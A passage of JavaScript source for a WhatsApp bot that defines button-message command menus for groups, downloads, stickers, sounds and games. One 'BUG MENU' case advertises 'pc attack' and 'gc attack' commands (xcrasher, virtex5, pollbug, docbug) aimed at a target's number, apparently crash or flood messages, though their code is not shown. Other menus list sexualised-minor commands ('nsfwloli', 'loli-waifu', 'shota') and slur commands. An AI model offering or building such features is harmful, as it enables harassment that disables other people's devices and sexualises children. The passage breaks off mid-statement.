  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ GROUP 	
╠${prefix}grouplink
╠${prefix}ephemeral [option]
╠${prefix}setgcpp [image]
╠${prefix}setname [text]
╠${prefix}setdesc [text]
╠${prefix}group
╠${prefix}botgroups
╠${prefix}resetgrouplink
╠${prefix}editinfo [option]
╠${prefix}add [user]
╠${prefix}menfess [number]
╠${prefix}kick [reply/tag]
╠${prefix}hidetag [text]
╠${prefix}tagall [text]
╠${prefix}autosticker [on/off]
╠${prefix}autostickerpc [on/off]
╠${prefix}leveling [on/off]
╠${prefix}antilinkgc [on/off] 
╠${prefix}antilinktg [on/off]
╠${prefix}antilinktt [on/off]
╠${prefix}antilinkytch [on/off]
╠${prefix}antilinkytvid [on/off]
╠${prefix}antilinkig [on/off]
╠${prefix}antilinkfb [on/off]
╠${prefix}antilinktwit [on/off]
╠${prefix}antilinkall [on/off]
╠${prefix}antivirus [on/off]
╠${prefix}antitoxic [on/off]
╠${prefix}antiwame [on/off]
╠${prefix}nsfw [on/off]
╠${prefix}promote [reply/tag]
╠${prefix}demote [reply/tag]
╠${prefix}react [reply emoji]
╠${prefix}getpp [reply user]
╠${prefix}vote
╠${prefix}devote
╠${prefix}upvote
╠${prefix}checkvote
╠${prefix}delvote
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'makermenu':{
var unicorn = await getBuffer(picak+'Maker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ MAKER 	
╠${prefix}candy
╠${prefix}8bit
╠${prefix}horror
╠${prefix}hoorror
╠${prefix}retro
╠${prefix}blackpinkneon
╠${prefix}deepsea
╠${prefix}scifi
╠${prefix}fiction
╠${prefix}berry
╠${prefix}fruitjuice
╠${prefix}biscuit
╠${prefix}wood
╠${prefix}chocolate
╠${prefix}matrix
╠${prefix}blood
╠${prefix}halloween
╠${prefix}wicker
╠${prefix}darkgold
╠${prefix}firework
╠${prefix}skeleton
╠${prefix}sand
╠${prefix}glue
╠${prefix}leaves
╠${prefix}magma
╠${prefix}lava
╠${prefix}rockart
╠${prefix}bloodglas
╠${prefix}underwater
╠${prefix}textmaker
╠${prefix}honey
╠${prefix}ice
╠${prefix}watercolor
╠${prefix}multicolor
╠${prefix}snow
╠${prefix}harrypot
╠${prefix}harrypotter
╠${prefix}brokenglass
╠${prefix}waterpipe
╠${prefix}spooky
╠${prefix}circuit
╠${prefix}metallic
╠${prefix}demon
╠${prefix}sparklechristmas
╠${prefix}christmas
╠${prefix}3dchristmas
╠${prefix}3dbox
╠${prefix}waterdrop
╠${prefix}lion2
╠${prefix}papercut
╠${prefix}transformer
╠${prefix}neondevil
╠${prefix}3davengers
╠${prefix}3dstone
╠${prefix}3dstone2
╠${prefix}summertime
╠${prefix}thunder
╠${prefix}window
╠${prefix}graffiti
╠${prefix}graffitibike
╠${prefix}pornhub
╠${prefix}glitch
╠${prefix}blackpinkart
╠${prefix}glitch2
╠${prefix}glitch3
╠${prefix}3dspace
╠${prefix}lion
╠${prefix}3dneon
╠${prefix}greenneon
╠${prefix}bokeh
╠${prefix}holographic
╠${prefix}bear
╠${prefix}wolf
╠${prefix}joker
╠${prefix}dropwater
╠${prefix}dropwater2
╠${prefix}thewall
╠${prefix}neonlight
╠${prefix}natural
╠${prefix}carbon
╠${prefix}pencil
╠${prefix}blackpink2
╠${prefix}neon
╠${prefix}neonlight2
╠${prefix}toxic
╠${prefix}strawberry
╠${prefix}discovery
╠${prefix}1917
╠ ${prefix}sci_fi
╠ ${prefix}ancient
╠ ${prefix}fabric
╠ ${prefix}hoorror
╠ ${prefix}whitebear
╠ ${prefix}juice
╠ ${prefix}batman
╠ ${prefix}multicolor
╠ ${prefix}wonderful
╠ ${prefix}sketch
╠ ${prefix}marvel
╠ ${prefix}foggy
╠ ${prefix}writing
╠ ${prefix}halloweenfire
╠ ${prefix}halloween
╠ ${prefix}watercolor
╠ ${prefix}classic
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'downloadmenu':{
var unicorn = await getBuffer(picak+'Download Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ DOWNLOAD 	
╠${prefix}tiktok [url]
╠${prefix}tiktokaudio [url]
╠${prefix}instagram [url]
╠${prefix}spotify [url]
╠${prefix}mediafire [url]
╠${prefix}ytmp3 [url|quality]
╠${prefix}ytmp4 [url|quality]
╠${prefix}gitclone [repo link]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'searchmenu':{
var unicorn = await getBuffer(picak+'Search Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ SEARCH 	
╠${prefix}play [query]
╠${prefix}song [query]
╠${prefix}yts [query]
╠${prefix}lyrics [query]
╠${prefix}google [query]
╠${prefix}google [query]
╠${prefix}anime [query]
╠${prefix}pinterest [query]
╠${prefix}image [query]
╠${prefix}wallpaper [query]
╠${prefix}searchno [number]
╠${prefix}horoscope [query]
╠${prefix}imdb [movie name]
╠${prefix}weather [loc name]
╠${prefix}genshin [char name]
╠${prefix}wikimedia [query]
╠${prefix}ytsearch [query]
╠${prefix}ringtone [query]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'convertmenu':{
var unicorn = await getBuffer(picak+'Convert Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ CONVERT 	
╠ ${prefix}toimage [reply stick]
╠ ${prefix}sticker [reply img|gif]
╠ ${prefix}take [reply img|gif|stik]
╠ ${prefix}smeme [reply img]
╠ ${prefix}emoji [emoji]
╠ ${prefix}tovideo [reply img]
╠ ${prefix}togif [reply stick]
╠ ${prefix}tovn [reply aud]
╠ ${prefix}tomp3 [reply vn]
╠ ${prefix}toaudio [reply vid]
╠ ${prefix}ebinary [reply txt]
╠ ${prefix}dbinary [reply txt]
╠ ${prefix}tinyurl [link]
╠ ${prefix}styletext [text]
╠${prefix}volume [reply aud]
╠${prefix}bass [reply aud]
╠${prefix}blown [reply aud]
╠${prefix}deep [reply aud]
╠${prefix}earrape [reply aud]
╠${prefix}fast [reply aud]
╠${prefix}fat [reply aud]
╠${prefix}nightcore [reply aud]
╠${prefix}reverse [reply aud]
╠${prefix}robot [reply aud]
╠${prefix}slow [reply aud]
╠${prefix}smooth [reply aud]
╠${prefix}squirrel [reply aud]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'randomimagemenu':{
var unicorn = await getBuffer(picak+'Random Image Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ RANDOM IMG 	
╠${prefix}coffee
╠${prefix}woof
╠${prefix}meow
╠${prefix}lizard
╠${prefix}chinese
╠${prefix}japanese
╠${prefix}korean
╠${prefix}indo
╠${prefix}thai
╠${prefix}vietnamese
╠${prefix}malay
╠${prefix}hijab
╠${prefix}randomgirl
╠${prefix}randomboy
╠${prefix}aesthetic
╠${prefix}antiwork
╠${prefix}cosplay
╠${prefix}car
╠${prefix}bike
╠${prefix}doggo
╠${prefix}cat
╠${prefix}notnot
╠${prefix}kayes
╠${prefix}justina
╠${prefix}ryujin
╠${prefix}boneka
╠${prefix}rose
╠${prefix}kpop
╠${prefix}blackpink
╠${prefix}ulzzangboy
╠${prefix}ulzzanggirl
╠${prefix}pubg
╠${prefix}hacking
╠${prefix}profilepicture
╠${prefix}couplepicture
╠${prefix}wallphone
╠${prefix}wallml
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'randomvideomenu':{
var unicorn = await getBuffer(picak+'Random Video Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ RANDOM VIDEO
╠${prefix}tiktokgirl	
╠${prefix}tiktoknukhty
╠${prefix}tiktokpanrika
╠${prefix}tiktokkayes
╠${prefix}tiktoknotnot
╠${prefix}tiktokghea
╠${prefix}tiktoksantuy
╠${prefix}tiktokbocil
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
           case 'emotemenu':{
var unicorn = await getBuffer(picak+'Emote Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ EMOTE 	
╠${prefix}instagramemoji
╠${prefix}facebookemoji
╠${prefix}iphoneemoji
╠${prefix}samsungemoji
╠${prefix}joyemoji
╠${prefix}skypeemoji
╠${prefix}twitteremoji
╠${prefix}whatsappemoji
╠${prefix}microsoftemoji
╠${prefix}googleemoji
╠${prefix}pediaemoji
╠${prefix}microsoftemoji
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'imageeffectmenu':{
var unicorn = await getBuffer(picak+'Image Effect Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═════✪ IMG EFFECT 	
╠${prefix}removebg [reply img]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'animemenu':{
var unicorn = await getBuffer(picak+'Anime Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ ANIME 	
╠${prefix}animeneko
╠${prefix}waifu
╠${prefix}shinobu
╠${prefix}animeawoo
╠${prefix}animewaifu
╠${prefix}foxgirl
╠${prefix}animenom
╠${prefix}goose
╠${prefix}8ball
╠${prefix}avatar
╠${prefix}tickle
╠${prefix}gecg
╠${prefix}feed
╠${prefix}husbu
╠${prefix}neko2
╠${prefix}randomanime
╠${prefix}shota
╠${prefix}waifu2
╠${prefix}animeslap
╠${prefix}animepat
╠${prefix}animeneko
╠${prefix}animekiss
╠${prefix}animewlp
╠${prefix}animecuddle
╠${prefix}animecry
╠${prefix}animekill
╠${prefix}animelick
╠${prefix}animebite
╠${prefix}animeyeet
╠${prefix}animebully
╠${prefix}animebonk
╠${prefix}animewink
╠${prefix}animepoke
╠${prefix}animesmile
╠${prefix}animewave
╠${prefix}animeawoo
╠${prefix}animeblush
╠${prefix}animesmug
╠${prefix}animeglomp
╠${prefix}animehappy
╠${prefix}animedance
╠${prefix}animecringe
╠${prefix}animehighfive
╠${prefix}animehandhold
╠${prefix}animemegumin
╠${prefix}animemegumin
╠${prefix}animesmug
╠${prefix}loli-waifu
╠${prefix}couplepp
╠${prefix}animewall [query]
╠${prefix}animewall2 [query]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'stickermenu':{
var unicorn = await getBuffer(picak+'Sticker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ STICKER 	
╠ ${prefix}patrick
╠ ${prefix}emoji
╠ ${prefix}emojimix
╠ ${prefix}doge
╠ ${prefix}lovesticker
╠ ${prefix}animestick
╠ ${prefix}spongebob
╠ ${prefix}gojosatoru
╠ ${prefix}nicholas
╠ ${prefix}cartoon
╠ ${prefix}stickman
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'animestickermenu':{
var unicorn = await getBuffer(picak+'Anime Sticker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ ANIME STICKER 	
╠${prefix}loli
╠${prefix}bully
╠${prefix}cuddle
╠${prefix}cry
╠${prefix}hug
╠${prefix}awoo
╠${prefix}kiss
╠${prefix}lick
╠${prefix}pat
╠${prefix}smug
╠${prefix}bonk
╠${prefix}yeet
╠${prefix}blush
╠${prefix}smile
╠${prefix}wave
╠${prefix}highfive
╠${prefix}handhold
╠${prefix}nom
╠${prefix}glomp
╠${prefix}bite
╠${prefix}slap
╠${prefix}kill
╠${prefix}happy
╠${prefix}wink
╠${prefix}poke
╠${prefix}dance
╠${prefix}cringe
╠${prefix}neko
╠${prefix}gura
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break 
case 'nsfwmenu':{
var unicorn = await getBuffer(picak+'Nsfw Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ NSFW 	
╠${prefix}gifhentai
╠${prefix}gifblowjob
╠${prefix}hentaivideo
╠${prefix}hneko
╠${prefix}nwaifu
╠${prefix}animespank
╠${prefix}trap
╠${prefix}gasm
╠${prefix}ahegao
╠${prefix}ass
╠${prefix}bdsm
╠${prefix}blowjob
╠${prefix}cuckold
╠${prefix}cum
╠${prefix}milf
╠${prefix}eba
╠${prefix}ero
╠${prefix}femdom
╠${prefix}foot
╠${prefix}gangbang
╠${prefix}glasses
╠${prefix}hentai
╠${prefix}jahy
╠${prefix}manga
╠${prefix}masturbation
╠${prefix}neko-hentai
╠${prefix}neko-hentai2
╠${prefix}nsfwloli
╠${prefix}orgy
╠${prefix}panties
╠${prefix}pussy
╠${prefix}tentacles
╠${prefix}thights
╠${prefix}yuri
╠${prefix}zettai
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'funmenu':{
var unicorn = await getBuffer(picak+'Fun Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ Fun 
╠ ${prefix}say [text]	
╠ ${prefix}define [text]
╠ ${prefix}how [text]
╠ ${prefix}when [text]
╠ ${prefix}where [text]
╠ ${prefix}is [text]
╠ ${prefix}what [text]
╠ ${prefix}can [text]
╠ ${prefix}rate [text]
╠ ${prefix}coolcheck [tag]
╠ ${prefix}stupidcheck [tag]
╠ ${prefix}waifucheck [tag]
╠ ${prefix}evilcheck [tag]
╠ ${prefix}dogcheck [tag]
╠ ${prefix}hotcheck [tag]
╠ ${prefix}smartcheck [tag]
╠ ${prefix}uncleancheck [tag]
╠ ${prefix}greatcheck [tag]
╠ ${prefix}beautifulcheck [tag]
╠ ${prefix}awesomecheck [tag]
╠ ${prefix}prettycheck [tag]
╠ ${prefix}lesbiancheck [tag]
╠ ${prefix}gaycheck [tag]
╠ ${prefix}cutecheck [tag]
╠ ${prefix}uglycheck [tag]
╠ ${prefix}hornycheck [tag]
╠ ${prefix}charactercheck [tag]
╠ ${prefix}lovelycheck [tag]
╠ ${prefix}couple
╠ ${prefix}soulmate
╠ ${prefix}hot
╠ ${prefix}sexy
╠ ${prefix}kind
╠ ${prefix}idiot
╠ ${prefix}handsome
╠ ${prefix}beautiful
╠ ${prefix}cute
╠ ${prefix}pretty
╠ ${prefix}lesbian
╠ ${prefix}noob
╠ ${prefix}bastard
╠ ${prefix}foolish
╠ ${prefix}nerd
╠ ${prefix}asshole
╠ ${prefix}gay
╠ ${prefix}smart
╠ ${prefix}stubble
╠ ${prefix}dog
╠ ${prefix}horny
╠ ${prefix}cunt
╠ ${prefix}wibu
╠ ${prefix}noobra
╠ ${prefix}nibba
╠ ${prefix}nibbi
╠ ${prefix}comrade
╠ ${prefix}mumu
╠ ${prefix}rascal
╠ ${prefix}scumbag
╠ ${prefix}nuts
╠ ${prefix}fagot
╠ ${prefix}scoundrel
╠ ${prefix}ditch
╠ ${prefix}dope
╠ ${prefix}gucci
╠ ${prefix}lit
╠ ${prefix}dumbass
╠ ${prefix}crackhead
╠ ${prefix}mf
╠ ${prefix}motherfucker
╠ ${prefix}sucker
╠ ${prefix}fuckboy
╠ ${prefix}playboy
╠ ${prefix}fuckgirl
╠ ${prefix}playgirl
╠ ${prefix}quotes
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'soundmenu':{
var unicorn = await getBuffer(picak+'Sound Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ Sound 	
╠ ${prefix}sound1
╠ ${prefix}sound2
╠ ${prefix}sound3
╠ ${prefix}sound4
╠ ${prefix}sound5
╠ ${prefix}sound6
╠ ${prefix}sound7
╠ ${prefix}sound8
╠ ${prefix}sound9
╠ ${prefix}sound10
╠ ${prefix}sound11
╠ ${prefix}sound12
╠ ${prefix}sound13
╠ ${prefix}sound14
╠ ${prefix}sound15
╠ ${prefix}sound16
╠ ${prefix}sound17
╠ ${prefix}sound18
╠ ${prefix}sound19
╠ ${prefix}sound20
╠ ${prefix}sound21
╠ ${prefix}sound22
╠ ${prefix}sound23
╠ ${prefix}sound24
╠ ${prefix}sound25
╠ ${prefix}sound26
╠ ${prefix}sound27
╠ ${prefix}sound28
╠ ${prefix}sound29
╠ ${prefix}sound30
╠ ${prefix}sound31
╠ ${prefix}sound32
╠ ${prefix}sound33
╠ ${prefix}sound34
╠ ${prefix}sound35
╠ ${prefix}sound36
╠ ${prefix}sound37
╠ ${prefix}sound38
╠ ${prefix}sound39
╠ ${prefix}sound40
╠ ${prefix}sound41
╠ ${prefix}sound42
╠ ${prefix}sound43
╠ ${prefix}sound44
╠ ${prefix}sound45
╠ ${prefix}sound46
╠ ${prefix}sound47
╠ ${prefix}sound48
╠ ${prefix}sound49
╠ ${prefix}sound50
╠ ${prefix}sound51
╠ ${prefix}sound52
╠ ${prefix}sound53
╠ ${prefix}sound54
╠ ${prefix}sound55
╠ ${prefix}sound56
╠ ${prefix}sound57
╠ ${prefix}sound58
╠ ${prefix}sound59
╠ ${prefix}sound60
╠ ${prefix}sound61
╠ ${prefix}sound62
╠ ${prefix}sound63
╠ ${prefix}sound64
╠ ${prefix}sound65
╠ ${prefix}sound66
╠ ${prefix}sound67
╠ ${prefix}sound68
╠ ${prefix}sound69
╠ ${prefix}sound70
╠ ${prefix}sound71
╠ ${prefix}sound72
╠ ${prefix}sound73
╠ ${prefix}sound74
╠ ${prefix}sound75
╠ ${prefix}sound76
╠ ${prefix}sound77
╠ ${prefix}sound78
╠ ${prefix}sound79
╠ ${prefix}sound80
╠ ${prefix}sound81
╠ ${prefix}sound82
╠ ${prefix}sound83
╠ ${prefix}sound84
╠ ${prefix}sound85
╠ ${prefix}sound86
╠ ${prefix}sound87
╠ ${prefix}sound88
╠ ${prefix}sound89
╠ ${prefix}sound90
╠ ${prefix}sound91
╠ ${prefix}sound92
╠ ${prefix}sound93
╠ ${prefix}sound94
╠ ${prefix}sound95
╠ ${prefix}sound96
╠ ${prefix}sound97
╠ ${prefix}sound98
╠ ${prefix}sound99
╠ ${prefix}sound100
╠ ${prefix}sound101
╠ ${prefix}sound102
╠ ${prefix}sound103
╠ ${prefix}sound104
╠ ${prefix}sound105
╠ ${prefix}sound106
╠ ${prefix}sound107
╠ ${prefix}sound108
╠ ${prefix}sound109
╠ ${prefix}sound110
╠ ${prefix}sound111
╠ ${prefix}sound112
╠ ${prefix}sound113
╠ ${prefix}sound114
╠ ${prefix}sound115
╠ ${prefix}sound116
╠ ${prefix}sound117
╠ ${prefix}sound118
╠ ${prefix}sound119
╠ ${prefix}sound120
╠ ${prefix}sound121
╠ ${prefix}sound122
╠ ${prefix}sound123
╠ ${prefix}sound124
╠ ${prefix}sound125
╠ ${prefix}sound126
╠ ${prefix}sound127
╠ ${prefix}sound128
╠ ${prefix}sound129
╠ ${prefix}sound130
╠ ${prefix}sound131
╠ ${prefix}sound132
╠ ${prefix}sound133
╠ ${prefix}sound134
╠ ${prefix}sound135
╠ ${prefix}sound136
╠ ${prefix}sound137
╠ ${prefix}sound138
╠ ${prefix}sound139
╠ ${prefix}sound140
╠ ${prefix}sound141
╠ ${prefix}sound142
╠ ${prefix}sound143
╠ ${prefix}sound144
╠ ${prefix}sound145
╠ ${prefix}sound146
╠ ${prefix}sound147
╠ ${prefix}sound148
╠ ${prefix}sound149
╠ ${prefix}sound150
╠ ${prefix}sound151
╠ ${prefix}sound152
╠ ${prefix}sound153
╠ ${prefix}sound154
╠ ${prefix}sound155
╠ ${prefix}sound156
╠ ${prefix}sound157
╠ ${prefix}sound158
╠ ${prefix}sound159
╠ ${prefix}sound160
╠ ${prefix}sound161
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'gamemenu':{
var unicorn = await getBuffer(picak+'Game Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ GAME 	
╠ ${prefix}truth
╠ ${prefix}dare
╠ ${prefix}tictactoe
╠ ${prefix}delttt
╠ ${prefix}guess [option]
╠ ${prefix}math [mode]
╠ ${prefix}suitpvp [tag]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'anonymousmenu':{
var unicorn = await getBuffer(picak+'Anonymous Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪ ANONYMOUS 	
╠${prefix}anonymous
╠${prefix}start
╠${prefix}next
╠${prefix}leave
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'databasemenu':{
var unicorn = await getBuffer(picak+'Database Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══✪ DATABASE 	
╠ ${prefix}setcmd
╠ ${prefix}listcmd
╠ ${prefix}delcmd
╠ ${prefix}lockcmd
╠ ${prefix}addmsg
╠ ${prefix}listmsg
╠ ${prefix}getmsg
╠ ${prefix}delmsg
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'othermenu':{
var unicorn = await getBuffer(picak+'Other Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OTHER 	
╠ ${prefix}afk
╠ ${prefix}id
╠ ${prefix}toqr [link]
╠ ${prefix}repeat
╠ ${prefix}readmore [text]
╠ ${prefix}toviewonce
╠ ${prefix}fliptext [text]] 
╠ ${prefix}alive
╠ ${prefix}script
╠ ${prefix}ping
╠ ${prefix}owner
╠ ${prefix}menu
╠ ${prefix}delete
╠ ${prefix}chatinfo
╠ ${prefix}quoted
╠ ${prefix}listpc
╠ ${prefix}listgc
╠ ${prefix}donate
╠ ${prefix}request
╠ ${prefix}report [bug]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
case 'warmenu':{
var unicorn = await getBuffer(picak+'War Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪「 BUG MENU 」	
╠════☾pc attack☽
╠${prefix}pcbut [number]
╠${prefix}pcvn [number]
╠${prefix}pcstick [number]
╠${prefix}pcfast [number]
╠${prefix}pcslow [number]
╠${prefix}pcbunny [number]
╠${prefix}xcrasher [amount]
╠${prefix}pccontact [amount]
╠${prefix}virtex5 [amount]
╠${prefix}flower [amount]
╠${prefix}pollbug [amount]
╠${prefix}catalogbug [amount]
╠${prefix}trollybug [amount]
╠${prefix}trollybug2 [amount]
╠════☾gc attack☽
╠${prefix}gcslow
╠${prefix}gcfast
╠${prefix}gcbunny
╠${prefix}tagallbug
╠════☾pc & gc attack☽
╠${prefix}vnbug [amount]
╠${prefix}docbug [amount]
╠${prefix}pcgcslow [number]
╠${prefix}pcgcfast [number]
╠${prefix}pcgcbunny [number]
╠${prefix}textshot
╠${prefix}docfuck [amount]
╠${prefix}docsoft [amount]
╠${prefix}docsoft2 [amount]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
